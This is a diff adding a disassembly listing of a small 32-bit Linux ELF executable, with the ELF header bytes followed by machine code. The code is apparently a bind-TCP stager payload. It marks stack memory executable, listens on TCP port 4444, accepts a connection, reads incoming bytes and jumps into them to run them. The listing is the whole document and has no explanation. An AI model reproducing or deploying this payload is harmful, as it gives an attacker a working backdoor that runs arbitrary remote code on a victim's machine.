@@ -1,0 +1,100 @@
+00000000  7F45              jg 0x47
+00000002  4C                dec esp
+00000003  46                inc esi
+00000004  0101              add [ecx],eax
+00000006  0100              add [eax],eax
+00000008  0000              add [eax],al
+0000000A  0000              add [eax],al
+0000000C  0000              add [eax],al
+0000000E  0000              add [eax],al
+00000010  0200              add al,[eax]
+00000012  0300              add eax,[eax]
+00000014  0100              add [eax],eax
+00000016  0000              add [eax],al
+00000018  54                push esp
+00000019  80040834          add byte [eax+ecx],0x34
+0000001D  0000              add [eax],al
+0000001F  0000              add [eax],al
+00000021  0000              add [eax],al
+00000023  0000              add [eax],al
+00000025  0000              add [eax],al
+00000027  003400            add [eax+eax],dh
+0000002A  2000              and [eax],al
+0000002C  0100              add [eax],eax
+0000002E  0000              add [eax],al
+00000030  0000              add [eax],al
+00000032  0000              add [eax],al
+00000034  0100              add [eax],eax
+00000036  0000              add [eax],al
+00000038  0000              add [eax],al
+0000003A  0000              add [eax],al
+0000003C  008004080080      add [eax-0x7ffff7fc],al
+00000042  0408              add al,0x8
+00000044  C20000            ret 0x0
+00000047  0030              add [eax],dh
+00000049  0100              add [eax],eax
+0000004B  0007              add [edi],al
+0000004D  0000              add [eax],al
+0000004F  0000              add [eax],al
+00000051  1000              adc [eax],al
+00000053  006A7D            add [edx+0x7d],ch
+00000056  58                pop eax
+00000057  99                cdq
+00000058  B207              mov dl,0x7
+0000005A  B900100000        mov ecx,0x1000
+0000005F  89E3              mov ebx,esp
+00000061  6681E300F0        and bx,0xf000
+00000066  CD80              int 0x80
+00000068  31DB              xor ebx,ebx
+0000006A  F7E3              mul ebx
+0000006C  53                push ebx
+0000006D  43                inc ebx
+0000006E  53                push ebx
+0000006F  6A02              push byte +0x2
+00000071  89E1              mov ecx,esp
+00000073  B066              mov al,0x66
+00000075  CD80              int 0x80
+00000077  51                push ecx
+00000078  6A04              push byte +0x4
+0000007A  54                push esp
+0000007B  6A02              push byte +0x2
+0000007D  6A01              push byte +0x1
+0000007F  50                push eax
+00000080  97                xchg eax,edi
+00000081  89E1              mov ecx,esp
+00000083  6A0E              push byte +0xe
+00000085  5B                pop ebx
+00000086  6A66              push byte +0x66
+00000088  58                pop eax
+00000089  CD80              int 0x80
+0000008B  97                xchg eax,edi
+0000008C  83C414            add esp,byte +0x14
+0000008F  59                pop ecx
+00000090  5B                pop ebx
+00000091  5E                pop esi
+00000092  52                push edx
+00000093  680200115C        push dword 0x5c110002
+00000098  6A10              push byte +0x10
+0000009A  51                push ecx
+0000009B  50                push eax
+0000009C  89E1              mov ecx,esp
+0000009E  6A66              push byte +0x66
+000000A0  58                pop eax
+000000A1  CD80              int 0x80
+000000A3  D1E3              shl ebx,1
+000000A5  B066              mov al,0x66
+000000A7  CD80              int 0x80
+000000A9  50                push eax
+000000AA  43                inc ebx
+000000AB  B066              mov al,0x66
+000000AD  895104            mov [ecx+0x4],edx
+000000B0  CD80              int 0x80
+000000B2  93                xchg eax,ebx
+000000B3  B60C              mov dh,0xc
+000000B5  B003              mov al,0x3
+000000B7  CD80              int 0x80
+000000B9  87DF              xchg ebx,edi
+000000BB  5B                pop ebx
+000000BC  B006              mov al,0x6
+000000BE  CD80              int 0x80
+000000C0  FFE1              jmp ecx
